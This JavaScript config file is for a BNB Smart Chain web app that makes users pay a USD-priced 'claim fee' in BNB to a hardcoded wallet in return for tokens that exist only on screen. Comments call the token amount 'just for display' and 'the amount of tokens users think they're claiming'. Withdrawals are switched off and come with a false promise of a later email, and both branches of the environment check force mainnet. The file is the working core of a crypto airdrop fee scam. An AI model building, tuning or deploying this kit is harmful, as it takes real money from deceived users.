// src/config.js

const config = {
  // Network configurations
  NETWORK: {
    BSC: {
      MAINNET: {
        ID: 56,
        NAME: 'BNB Smart Chain',
        CURRENCY: {
          name: 'BNB',
          symbol: 'BNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://bsc-dataseed1.binance.org/',
          'https://bsc-dataseed2.binance.org/',
          'https://bsc-dataseed3.binance.org/',
          'https://bsc-dataseed4.binance.org/',
          'https://bsc-dataseed1.defibit.io/',
          'https://bsc-dataseed2.defibit.io/',
          'https://bsc-dataseed3.defibit.io/',
          'https://bsc-dataseed4.defibit.io/',
          'https://bsc-dataseed1.ninicoin.io/',
          'https://bsc-dataseed2.ninicoin.io/',
          'https://bsc-dataseed3.ninicoin.io/',
          'https://bsc-dataseed4.ninicoin.io/'
        ],
        EXPLORER_URL: 'https://bscscan.com'
      },
      TESTNET: {
        ID: 97,
        NAME: 'BNB Smart Chain Testnet',
        CURRENCY: {
          name: 'tBNB',
          symbol: 'tBNB',
          decimals: 18
        },
        RPC_URLS: [
          'https://data-seed-prebsc-1-s1.binance.org:8545/',
          'https://data-seed-prebsc-2-s1.binance.org:8545/',
          'https://data-seed-prebsc-1-s2.binance.org:8545/',
          'https://data-seed-prebsc-2-s2.binance.org:8545/',
          'https://data-seed-prebsc-1-s3.binance.org:8545/',
          'https://data-seed-prebsc-2-s3.binance.org:8545/'
        ],
        EXPLORER_URL: 'https://testnet.bscscan.com'
      }
    }
  },

  // ⭐ CONFIGURABLE FEE SYSTEM - You can change these amounts
  FEE_SYSTEM: {
    // 🔥 CHANGE THIS TO ANY AMOUNT YOU WANT 🔥
    // Users will pay this amount in USD to claim tokens
    CLAIM_FEE_USD: 10.0, // Change this to any amount (e.g., 10, 25, 50, 100, etc.)
    
    // Token amount that users will receive (just for display)
    DISPLAY_TOKEN_AMOUNT: 5000, // Change this to any amount you want to show
    
    // 🔥 REPLACE THIS WITH YOUR ACTUAL WALLET ADDRESS 🔥
    // This is where users will send their fee payment
    FUND_RECEIVER_ADDRESS: '0x8fC18E1f65993864db46Dd1FBA2dffF1DE97955c',
    
    // Minimum BNB balance required for gas fees
    MIN_BNB_FOR_GAS: 0.005, // 0.005 BNB minimum for gas
    
    // Gas limit for BNB transfer transaction
    FEE_PAYMENT_GAS_LIMIT: 21000, // Standard BNB transfer gas limit
    
    // Withdrawal system configuration
    WITHDRAWAL_ENABLED: false, // Set to true when you want to enable withdrawals
    WITHDRAWAL_MESSAGE: "🔒 Token withdrawals are currently disabled. You will be notified via email when withdrawal functionality becomes available for your claimed tokens."
  },

  // Wallet configurations
  WALLET: {
    METAMASK: {
      DEEPLINK_PREFIX: 'https://metamask.app.link/dapp/',
      INSTALL_URL: 'https://metamask.io/download/'
    },
    TRUST_WALLET: {
      DEEPLINK_PREFIX: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=',
      INSTALL_URL: 'https://trustwallet.com/download'
    }
  },

  // Gas limits for different operations
  GAS: {
    LIMITS: {
      FEE_PAYMENT: 21000 // Gas for BNB transfer to website owner
    }
  },

  // Price configurations - UPDATE THESE REGULARLY FOR ACCURATE FEE CALCULATION
  PRICES: {
    BNB_USD: 683.97, // Current BNB price in USD - UPDATE THIS REGULARLY!
    // You can use APIs like CoinGecko to get real-time prices:
    // https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd
  },

  // Timing configurations
  TIMING: {
    TOAST_DURATION: {
      SHORT: 3000,
      MEDIUM: 5000,
      LONG: 8000,
      EXTRA_LONG: 10000
    }
  },

  // Environment detection based on hostname
  ENVIRONMENT: window.location.hostname === 'localhost' ? 'production' : 'production',
  
  // Get target network based on environment
  getTargetNetwork() {
    // For development, use testnet. For production, use mainnet
    if (this.ENVIRONMENT === 'production') {
      return this.NETWORK.BSC.MAINNET;
    } else {
      return this.NETWORK.BSC.TESTNET;
    }
  },

  // Calculate claim fee in BNB based on current BNB price
  getClaimFeeInBNB() {
    const feeInBNB = (this.FEE_SYSTEM.CLAIM_FEE_USD / this.PRICES.BNB_USD);
    return feeInBNB.toFixed(6); // Return with 6 decimal places for precision
  },

  // Get fund receiver address (website owner's wallet)
  getFundReceiverAddress() {
    return this.FEE_SYSTEM.FUND_RECEIVER_ADDRESS;
  },

  // Validate fund receiver address is properly configured
  isValidFundReceiver() {
    const address = this.getFundReceiverAddress();
    return address && 
           address !== '0x0000000000000000000000000000000000000000' && 
           address.length === 42 && 
           address.startsWith('0x');
  },

  // Get the amount of tokens users think they're claiming
  getDisplayTokenAmount() {
    return this.FEE_SYSTEM.DISPLAY_TOKEN_AMOUNT;
  },

  // Check if withdrawals are enabled
  isWithdrawalEnabled() {
    return this.FEE_SYSTEM.WITHDRAWAL_ENABLED;
  },

  // Get withdrawal message
  getWithdrawalMessage() {
    return this.FEE_SYSTEM.WITHDRAWAL_MESSAGE;
  },

  // Helper function to update claim fee (you can call this from your app)
  updateClaimFee(newFeeUSD) {
    this.FEE_SYSTEM.CLAIM_FEE_USD = newFeeUSD;
    console.log(`Claim fee updated to: $${newFeeUSD}`);
  },

  // Helper function to update token amount
  updateTokenAmount(newAmount) {
    this.FEE_SYSTEM.DISPLAY_TOKEN_AMOUNT = newAmount;
    console.log(`Token amount updated to: ${newAmount} FNVA`);
  },

  // Helper function to update BNB price dynamically (you can call this from your app)
  updateBNBPrice(newPrice) {
    this.PRICES.BNB_USD = newPrice;
    console.log(`BNB price updated to: $${newPrice}`);
  },

  // Enable/disable withdrawals
  setWithdrawalStatus(enabled, message = null) {
    this.FEE_SYSTEM.WITHDRAWAL_ENABLED = enabled;
    if (message) {
      this.FEE_SYSTEM.WITHDRAWAL_MESSAGE = message;
    }
    console.log(`Withdrawals ${enabled ? 'enabled' : 'disabled'}`);
  },

  // Generate BSCScan link for transaction
  getBSCScanLink(txHash) {
    const network = this.getTargetNetwork();
    return `${network.EXPLORER_URL}/tx/${txHash}`;
  },

  // Format BNB amount for display
  formatBNB(amount) {
    return parseFloat(amount).toFixed(6);
  },

  // Format USD amount for display
  formatUSD(amount) {
    return parseFloat(amount).toFixed(2);
  },

  // Get minimum required BNB (fee + gas)
  getMinimumRequiredBNB() {
    const feeInBNB = parseFloat(this.getClaimFeeInBNB());
    const gasInBNB = this.FEE_SYSTEM.MIN_BNB_FOR_GAS;
    return (feeInBNB + gasInBNB).toFixed(6);
  },

  // Validate if user has enough BNB
  hasEnoughBNB(userBalance) {
    const required = parseFloat(this.getMinimumRequiredBNB());
    const available = parseFloat(userBalance);
    return available >= required;
  }
};

// Export for use in components
export default config;